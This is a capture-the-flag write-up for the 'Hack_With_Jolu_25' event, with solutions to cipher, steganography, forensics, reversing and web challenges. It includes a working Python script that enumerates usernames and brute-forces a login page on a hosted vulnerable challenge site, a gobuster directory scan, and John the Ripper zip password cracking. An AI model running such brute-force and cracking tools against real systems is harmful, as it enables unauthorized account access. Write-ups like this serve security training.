# Hack_With_Jolu_25

## Challenge: Lost Beach

### Description:

Category: OSINT / Forensics
Points: 50
Prompt:
I wonder where this was taken
Flag Format: hwj{Name_Of_The_Place}

### Initial Obs:

a simple photograph is given which might indicate that something is in the hidden metadata. As the picture itself contains mountains 

### Tools:

exiftool

### Solution:

When ran exiftool command on the image we got coordinated which when put into google maps gives us the name of the place, that is rickroll beach

### Final Flag: hwj{rick_roll_island}

---

## Challenge: Evil Corp’s Cipher

### Description:

Category: Cryptography
Points: 150
Prompt:
A rogue mathematician tried to protect a precious flag by twisting it through a
series of Python-powered calculations. Addition, subtraction, maybe even some
sneaky bitwise tricks—you name it. The final scrambled result now sits in a
lonely .txt file, waiting for someone clever enough to untangle it.
The code that caused this chaos is in your hands… but the original flag isn’t.
Can you reverse the logic and bring the hidden flag back to life?

### Initial Obs:

Probably needed to reverse the python logic.  

### Tools:

chatgpt

### Solution:

told chatgpt to reverse the script and ran it and got the flag 

```python
def x(b, k):
    k = k.encode()
    return bytes([b[i] ^ k[i % len(k)] for i in range(len(b))])

# STEP 1: Your encrypted hex string from print(f.hex())
encrypted_hex = "aa120e1211d3c1c0cfdfc0ccc2ddd3d6dbc6d2c1cfd0c0dfc0d0cfa8c5cbc5"  # example — replace this with your actual output

# STEP 2: Convert hex → bytes
encrypted = bytes.fromhex(encrypted_hex)

# STEP 3: Reverse the bytes
reversed_bytes = encrypted[::-1]

# STEP 4: XOR with "hwj" again (same as original key)
xor_result = x(reversed_bytes, "hwj")

# STEP 5: Subtract 69 from each byte
shifted = bytes([b - 69 for b in xor_result])

# STEP 6: Convert bytes to string
decoded = shifted.decode()

# STEP 7: Replace '1' back to 'a'
original_flag = decoded.replace('1', 'a')

print("Recovered flag:", original_flag)

```

### Final Flag: hwj{successfully_reversed_6543}

---

## Challenge: FRACtured Kingdom

### Description:

Category: Cryptography
Points: 250
Prompt:
The royal court trusted their “unbreakable” RSA encryption to safeguard a
message that could topple an empire. But arrogance breeds mistakes. The
modulus N you’ve intercepted looks formidable… yet whispers say its two prime
pillars aren’t as far apart as they should be.
The ciphertext lies before you, daring you to break centuries of trust in a single
stroke. Can you find the hidden

### Initial Obs:

Two close primes and rsa screams fermat factorization

### Tools:

python script

### Solution:

used a python script to factorize the primes and get the flag. 

```python
import math
from Crypto.Util.number import long_to_bytes, inverse

def fermat_factor(N):
    a = math.isqrt(N)
    if a * a < N:
        a += 1
    b2 = a * a - N
    while not math.isqrt(b2) ** 2 == b2:
        a += 1
        b2 = a * a - N
    b = math.isqrt(b2)
    p = a - b
    q = a + b
    return p, q

n = 71091905925680723976577718939574452545777038982784899502561458194290386561115498443094150110199881743263518067838916127652277069054002554717386743491938382810486433145609396499829079537631464525496732277144505264594327554852778431262509233474649777240563135831663821173957019307085286819825537705667366716051
c = 35403283897932069456936385757714318204148233495673080128448972872397581571949157073691539783097483731051481126700252695184260894631914414722360685375065333150002640272330055850138682322761257106260090271652675144749742342803150462843348161491289866710770200725002983158729411992462511421729561716192288564480
e = 65537

p, q = fermat_factor(n)
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))

```

### Final Flag: hwj{Fermat_Factorization_G34FD}

---

## Challenge: I Loe you guys

### Description:

Category: Cryptography
Points: 150
Prompt:
GXFGMTSOJSCZ
Da was telling me he found out some of you are sharing flags...
Play fairly, else you will be disqualified...
Consider this as your last warning.

### Initial Obs:

Same a cipher question. Ran it through dcode.cipher and found a cipher which might work using the hint from the question is that “play fairly”. It might be playfair cipher

### Tools:

dcode.fr

### Solution:

The only thing i needed to find out was to use which letter combination which i got hint from the challenge title which omits the v from the love. hinting at “-v”

### Final Flag: hwj{fortnitex}

---

## Challenge: Code 45

### Description:

Category: Cryptography
Points: 120
Prompt:
The message came encoded, hidden behind a veil of digits.
Its structure wasn’t uniform — some symbols stood alone, others leaned on a
pair for support.
Patterns emerged around two particular markers. They appeared just enough to
feel important, yet not enough to reveal themselves entirely.
Whatever system is at play, it doesn’t walk a straight path — it steps lightly,
straddling the line between simplicity and misdirection.
Can you follow its rhythm and recover what was meant to stay hidden?

### Initial Obs:

We understood that its a straddling checkerboard cipher from the hint and also wroding of the question. Then fromt he title we got the left key “4 5”

### Tools:

[https://www.cachesleuth.com/straddlecheckerboard.html](https://www.cachesleuth.com/straddlecheckerboard.html)

### Solution:

![image.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/image.png)

### Final Flag: hwj{enchanted}

---

## Challenge: Shankar’s Speech

### Description:

Category: Cryptography
Points: 100
Prompt:
Shankar was born in the slums. Since birth, he had a speech defect and no one
understood what he said. But only his friends knew the special dialect Shankar
spoke.
Here, can you get what he says:
ODXIFXN YXIP OLZXF LNKLZNGU
Write the flag in hwj{} with all lowercase words separated by underscores.

### Initial Obs:

probably a cipher 

### Tools:

dcode.fr

### Solution:

![msedge_JHGbf4Mige.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/msedge_JHGbf4Mige.png)

### Final Flag: hwj{shankar_cant_speak_properly}

---

## Challenge: Climb the ladder

### Description:

Category: Cryptography
Points: 80
Prompt:
An old typewriter was found in a dusty attic. It had an odd quirk—every time
someone typed a letter, it clicked and printed a slightly different letter instead.
No one knew why, but it always followed the same pattern.
Some curious kid used it to type a flag, thinking nobody would ever read it
again. But the paper survived, and so did the strange encoding... Can you fix
what the machine typed?
Machine Code: hxl{1_4t_se57_4_a1v}

### Initial Obs:

There is a shift of characters in the cipher. It keeps on increasing from left to right.

### Tools:

No tools

### Solution:

Just keep on shifting the cipher backwards with an increasing shift and go from z → a if finished and avoid the numbers and brackets and underscores.

### Final Flag: hwj{1_4m_ju57_4_k1d}

---

## Challenge: XOR Mania

### Description:

Category: Cryptography
Points: 80
Prompt:
The flag is encrypted with a secure method. Can you recover it?
CipherText: 7a6578696a22604d23614d652173796f
Key: 18

### Initial Obs:

From first look, prolly it was xor cipher with key 18. 

### Tools:

dcode.cipher

### Solution:

Cause we know 18 in decimal is 12 in hexadecimal

![image.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/image%201.png)

### Final Flag: hwj{x0r_1s_w3ak}

---

## Challenge: The Gatekeeper

### Description:

Category: Reverse Engineering
Points: 250
Prompt:
An unassuming .exe guards the flag behind a secret PIN. Enter the wrong
code, and it stays silent. Enter the right one, and the flag is yours. Somewhere
within its logic, the correct key is hidden, waiting for someone bold enough to
uncover it.
Can you reverse the program’s defenses and find the one PIN that unlocks the
secret?

### Initial Obs:

Tried to “strings” run the file ,did not run anything. When the exe file ran isolated, it asked for a pin. So, “to find its logic” i used ghidra

### Tools:

ghidra (to rev engineer the code)

### Solution:

rev engineeried the code from ghidra. IT was clearly mentioned the value which should be equal to. Transformed into decimal and got the pin 3769. Then put the pin while running the program on command prompt as it was crashing when ran isolated. 

### Final Flag:  hwj{PIN_Authenticated_N8932H}

---

## Challenge: Brewed with Bugs 1

### Description:

Category: Web Exploitation
Points: 250
Prompt:
The login page looks simple—almost too simple. No signup option, no reset
link… but the site seems chatty when you test usernames. Sometimes it
complains differently when you get something right.
Can you enumerate valid usernames, crack the password with some patience,
and sip the first flag? A list of possible usernames and passwords are provided.

[https://vuln-coffee-shop.onrender.com/](https://vuln-coffee-shop.onrender.com/)

[https://vuln-coffee-shop.onrender.com/](https://vuln-coffee-shop.onrender.com/)

### Initial Obs:

From the prompt it is clear that we have to brute force the usernames and passwords based on different responses. 

### Tools:

Python script

### Solution:

```python
#!/bin/python3

import requests
import time
import json

URL = 'https://vuln-coffee-shop.onrender.com/login'
# https://vuln-coffee-shop.onrender.com/login
username_file = "usernames.txt"
password_file = "passwords.txt"

print("[+] Bypassing auth by checking for valid usernames...\n")

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def find_valid_username(usernames):
    print("Checking usernames...\n[", end="", flush=True)
    for user in usernames:
        headers= { "Content-Type": "application/json" }
        data = {
            "username": user,
            "password": "wrongpass"
        }
        # demo request made to the api
        # const res = await fetch("/login", {
    #     method: "POST",
    #     headers: { "Content-Type": "application/json" },
    #     body: JSON.stringify({ username, password })
    #   });

        response = requests.post(URL, json=data, headers=headers)
        print("#", end="", flush=True)

        # Check if error message for invalid username is not present
        validusers =[]
        if "Invalid username" not in response.text:
            # print("]")  # Close progress bar
            print(response.text)
            validusers.append(user)
            print(user)
            # return user

    print("]")  # Close progress bar
    print(validusers)
    return None

def brute_force_password(username, passwords):
    print(f"\n[+] Starting password brute-force for: {username}")
    print("Trying passwords...\n[")

    for password in passwords:
        headers= { "Content-Type": "application/json" }
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(URL, json=data, headers=headers, allow_redirects=True)

        print("#", end="", flush=True)
        time.sleep(0.5)  # avoid triggering rate limit

        # Check if login successful
        if "Wrong password" not in response.text:
            print("]")
            print(response.text)
            print(f"[+] SUCCESS! Username: {username} | Password: {password}")
            return

    print("]")
    print("[!] Password not found.")

def main():
    usernames = read_file(username_file)
    passwords = read_file(password_file)

    # print('- ' * 50)
    # print(f"Scanning {len(usernames)} usernames...")
    # print('- ' * 50)

    # valid_user = find_valid_username(usernames)
    # if not valid_user:
    #     print("[!] No valid username found.")
    #     return

    # print(f"\n[+] Valid username found: {valid_user}")

    brute_force_password("administrator", passwords) # was not running at once so, had to find the usernames first then got the admin username and ran for it and found the flag

if __name__ == "__main__":
    main()
```

This script is not well cleaned or optimized. Just made it work tweaking the values. 

### Final Flag: hwj{coffee_admin_pwned}

---

## Challenge: Brewed with Bugs 2

### Description:

Category: Web Exploitation
Points: 150
Prompt:
Rumor says there’s a hidden menu the developers didn’t want anyone to see.
It’s buried somewhere deep in the site’s structure. With the right directory brute
force, you might just find a secret blend that leads to the second flag.
[https://vuln-coffee-shop.onrender.com/](https://vuln-coffee-shop.onrender.com/)

### Initial Obs:

It clearly says in the prompt that we have to directory brute force it. 

### Tools:

gobuster (to directory brute force it)

### Solution:

```python
gobuster dir -u https://vuln-coffee-shop.onrender.com/ -w wordlist.txt
```

we get the /secret endpoint which contains the flag.

### Final Flag: hwj{coffee_dirbuster_found_me}

---

## Challenge: Simon says All the Best

### Description:

Category: Sanity
Points: 80
Prompt:
Howling winds clawed at the windows as dusk swallowed the village. Whispers
curled through the chimney, murmuring secrets too old for names. Just as Mira
bolted the door, she heard the soft knock again. Brace yourself, she thought,
clutching the rusted lantern with trembling fingers. Cold moonlight spilled
through the cracks as the door creaked open. Ashes scattered across the floor
where footprints once were. Reaching into her coat, she pulled out the torn
journal. Dust bloomed with every page she turned, its words faded but furious.
Inside, a sketch of a cardigan stared back at her—stitched, tagged, and ancient.
Guilt clawed at her as she remembered what she’d done that winter. All that
remained was to return it. Nightfall welcomed her steps as she vanished into the
hills, the wind carrying the cardigan’s curse once more}

### Initial Obs:

The challenge contained a lengthy, mysterious narrative paragraph. There were no files or
additional attachments, so the flag had to be embedded in the text itself. 

### Tools:

No tools 

### Solution:

We see the capitalised letters give us the flag. Writing down the apitalised letters of the flag, we get he whole flag HWJBCARDIGAN which translates to hwj{cardigan} 

### Final Flag: hwj{cardigan}

---

## Challenge: Quarterly Selections

### Description:

Category: Forensics / Document Analysis
Points: 150
Prompt:
This document was prepared by Arunima from the Design Team. She insisted
on using her minimalist aesthetic again. We gave up arguing. Please review the
report anyway, and let us know if you find anything meaningful. We didn’t.

### Initial Obs:

The provided file was a Word document (.docx). Based on the prompt, the document
appeared visually minimal or possibly even blank. The challenge hinted at the presence of
hidden or invisible content due to formatting or styling.

### Tools:

 Microsoft Word (to open the document) 

### Solution:

When we press ctrl + a on the word page, it reaveals specific part of the document,where our flag can be found which was white coloured and reduced to size. We find the flag → hwj{size_does_matter} 

### Final Flag: hwj{size_does_matter}

---

## Challenge: Unicode

### Description:

Category: Forensics / Steganography
Points: 288
Prompt:
Nothing suspicious here. Just a simple text you might read without thinking too
much.

### Initial Obs:

The file contained invisible characters which pointed to unicode steganography.  

### Tools:

[https://330k.github.io/misc_tools/unicode_steganography.html](https://330k.github.io/misc_tools/unicode_steganography.html)

### Solution:

When we out the text into this decoder, we get the decoded flag → hwj{z3r0_w1dth_1nv1s1bl3_m3ssag3}

### Final Flag: hwj{z3r0_w1dth_1nv1s1bl3_m3ssag3}

---

## Challenge:  Painting on the Wall

### Description:

Category: Forensics / Steganography
Points: 80
Prompt:
I dropped by an old friend’s place the other day, and something immediately
caught my eye.
Hanging on the wall, just above his study table, was a peculiar painting — one
I’d never seen before.
You know how in movies and old thrillers, paintings sometimes conceal
secrets—hidden safes, wads of cash, or something far more dangerous?
I couldn’t shake the feeling that this one was hiding more than just a blank wall
behind it.

### Initial Obs:

We get a hint at steganography. So we proceed with the basic recon steps  

### Tools:

steghide (to extract the data)

### Solution:

```python
steghide extract -sf painting.jpg -p 
```

When prompted with no password, the a file was extracted which contained the flag → hwj{h1dd3n_1n_pl41n_s1ght} 

### Final Flag: hwj{h1dd3n_1n_pl41n_s1ght}

---

## Challenge: Commitment Issue

### Description:

Category: Forensics / Steganography
Points: 20
Prompt:
My girlfriend thinks she knows me well, but even I don’t know about me
properly…
How well do you think you know me?

### Initial Obs:

We again get a hint at steganography. After a bit of osint, we find the phrase “askpolitely” which was the password to the file extraction using steghide

### Tools:

steghide (for file extraction from image)

### Solution:

```python
steghide extract -sf snorlaxx.jpg -p "askpolitely" 
```

This gives a file where the flag was stored, after reading it we get →  hwj{snorlax_keeps_dreaming_because_you_keep_overthinking}

### Final Flag: hwj{snorlax_keeps_dreaming_because_you_keep_overthinking}

---

## Challenge:  Droid Whisperer

### Description:

Category: Forensics / Mobile Forensics
Points: 300
Prompt:
A mysterious Android device image (.ad1) has surfaced, and rumor has it that
the owner’s WhatsApp chats hold the key to the flag.
Your mission: Mount, explore, and extract the truth from WhatsApp data.

### Initial Obs:

We are given an android device image which we have to find the flag from. It was clear you can found nothing before you have extracted the files from the diskimage. 

### Tools:

file (to verify file format)
binwalk (to extract embedded files)
Custom Python script (for decompressing Zlib streams)
grep (for string filtering)

### Solution:

Verified File Type:
Ran the file command:

bash
Copy code
file android_image.ad1
Output:

kotlin
Copy code
android_image.ad1: data
1.

Extracted Embedded Content:
Used binwalk to analyze the image and extract files:

bash
Copy code
binwalk --extract android_image.ad1
2.  This produced multiple zlib-compressed files in the
_android_image.ad1.extracted/ directory.

Decompressed Zlib Data:
Used a Python script to recursively decompress all .zlib files and store the outputs in a
directory named zlib_output:

Python Script:

python:
import zlib
import os

input_dir = "./_android_image.ad1.extracted"
output_dir = "./zlib_output"
os.makedirs(output_dir, exist_ok=True)

index = 0
for root, dirs, files in os.walk(input_dir):
for filename in files:
filepath = os.path.join(root, filename)
with open(filepath, 'rb') as f:
data = f.read()
try:
decompressed = zlib.decompress(data)
output_path = os.path.join(output_dir,
f"{index}.out")
with open(output_path, 'wb') as out:
out.write(decompressed)
index += 1
except Exception:
continue
3.

Searched for the Flag:
After decompression, searched for flag-like strings:

bash
Copy code
strings *.out | grep -i "hwj"
4.

Recovered Flag:
The following flag was identified in one of the .out files:

Copy code
hwj{ANDR01D_ART1F4CT5_D3C0D3D}

### Final Flag: hwj{ANDR01D_ART1F4CT5_D3C0D3D}

---

## Challenge: Locked Flag

### Description:

Category: Forensics / Steganography
Points: 219
Prompt:
You have a locked flag. Don't lose the key you found, it is not the answer but it
will take you to your answer.

### Initial Obs:

Again we can predict this is a stego challenge from the image file provided. Also the prompt implies this time the file is password-locked.

### Tools:

exiftool (to find the key)

steghide (to extract the text)

### Solution:

```python
exiftool file.jpeg -> we get the key "hwj{this_is_your_key}"
```

We use this key to run 

```python
steghide extract -sf lockedflag.jpeg -p "hwj{this_is_your_key}" 
```

After extracting, we get a file which has the flag → hwj{m3t4_is_the_k3y}

### Final Flag: hwj{m3t4_is_the_k3y}

---

## Challenge: Hidden Text

### Description:

Category: Forensics / Steganography
Points: 90
Prompt:
You caught an encrypted message. But they were not so good at hiding it.

### Initial Obs:

The provided file was found blank but when you press ctrl A, you see the presence of the characters. This is whitespace encoding. 

### Tools:

[https://www.dcode.fr/whitespace-language](https://www.dcode.fr/whitespace-language) → online decoder

### Solution:

![image.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/image%202.png)

### Final Flag: hwj{wh1t3sp4c3s_ar3_b4ck}

---

## Challenge: Are you blind ?

### Description:

Category: Forensics / Steganography / Metadata
Points: 80
Prompt:
You can read the flag only if you are blind
Flag Format: hwj{flag}

### Initial Obs:

The challenge hints to steganography. we get a file without any extension. After running file command we get that it’s a png file

### Tools:

zsteg (to find the hidden data) 

### Solution:

When we run 

```python
zsteg file.jpg
```

we get meta label: text→ icanseebrl

Assuming this was the flag content…. it worked

### Final Flag: hwj{icanseebrl}

---

## Challenge: Hidden Pixels

### Description:

Category: Forensics / Steganography
Points: 80
Prompt:
This image looks so innocent, but are you sure?
ENTER in the pixel level!

### Initial Obs:

We can easily understand from the description that this is a stegochallenge.

### Tools:

steghide (for steganography file extraction) 

### Solution:

```python
steghide extract -sf pixel.jpg
```

When i prompted the file without any password, it gave a file called pixel.txt. After 

```python
cat pixel.txt
```

We retrieve the flag → hwj{pixe1s_n3v3r_1ie} 

### Final Flag: hwj{pixe1s_n3v3r_1ie}

---

## Challenge: Zip Brute

### Description:

Category: Forensics / Password Cracking
Points: 150
Prompt:
You’ve stumbled upon an old zip file. There’s a problem — the creator forgot the
password.
Somewhere in the depths of time, the key was lost, leaving only this locked file
behind.
The contents are said to hold something valuable, but without the right
combination, it’s just a digital vault mocking you.
Can you figure out how to unlock its secrets and reveal what’s inside?

### Initial Obs:

This is a locked zip file. So, from the title we can guess that we have to brute force the password. 

### Tools:

unzip (Linux terminal)
zip2john (for converting ZIP hash)
john (John the Ripper) — for password brute-force

### Solution:

```python
zip2john protected.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Password retrieved from john → idontknow

Using the password we unlock the file and find a text file called flag.txt which contains the flag → hwj{brute_forced_FN2FB923}

### Final Flag: hwj{brute_forced_FN2FB923}

---

## Challenge: Beep Beep

### Description:

Category: Forensics / Audio
Points: 120
Prompt:
Found a strange audio transmission. What is it?
Every letter in the decoded message is lowercase, and words are separated by
underscores (_).
Flag format: hwj{...}
Example: hwj{fak3_f1ag}

### Initial Obs:

The provided file was a .wav file. After one hear, you can predict its morse code.

### Tools:

[https://morsecode.world/international/decoder/audio-decoder-adaptive.html](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

### Solution:

![chrome_M97TE7C41s.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/chrome_M97TE7C41s.png)

Text decoded →  **H W J M 0 R S 3 C 0 D 3 1 S F U N**

### Final Flag: hwj{m0rs3_c0d3_1s_fun}

---

## Challenge: My Desktop

### Description:

Category: Forensics
Points: 80
Prompt:
Hey! The file you were looking for is in my desktop (somewhere...)

### Initial Obs:

This was a zip file. And from the prompt we can guess that the flag is hidden somewhere between the folder. 

### Tools:

unzip (Linux terminal)
grep (for pattern search)
Command-line navigation (cd, ls, etc.)

### Solution:

```python
unzip My_Desktop.zip
```

We get a bunch of txt files. 

Then searching recursively through the text files….

```python
grep -ir "hwj{"
```

![VirtualBoxVM_EexULRhdI0.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/VirtualBoxVM_EexULRhdI0.png)

### Final Flag: hwj{cha0tic_m3ss_N435GX}

---

## Challenge: Rotation

### Description:

Category: Forensics / Steganography
Points: 50
Prompt:
Look! It is rotating. Are your eyes fast enough?
Note: There are no uppercase letters, those are numbers.

### Initial Obs:

A certain code is flashed in a frame in the gif which might be a possible cipher which leads to the flag. 

### Tools:

[ezgif.com](http://ezgif.com) → To extract frames from the gif

google lens → For getting the text from the image

[https://www.dcode.fr/rot-cipher](https://www.dcode.fr/rot-cipher) → To decode the cipher

### Solution:

![image.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/image%203.png)

![image.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/image%204.png)

Text recovered: **lan{v0xexm0r_mw_w0_jyr}**

Decoding it in [dcode.fr](http://dcode.fr) → 

![chrome_P8OYOSGpZO.png](Hack_With_Jolu_25%2023e3c5d54c76801a9b28dc355e8e53ff/chrome_P8OYOSGpZO.png)

Hence revored flag → hwj{r0tati0n_is_s0_fun}

### Final Flag: hwj{r0tati0n_is_s0_fun}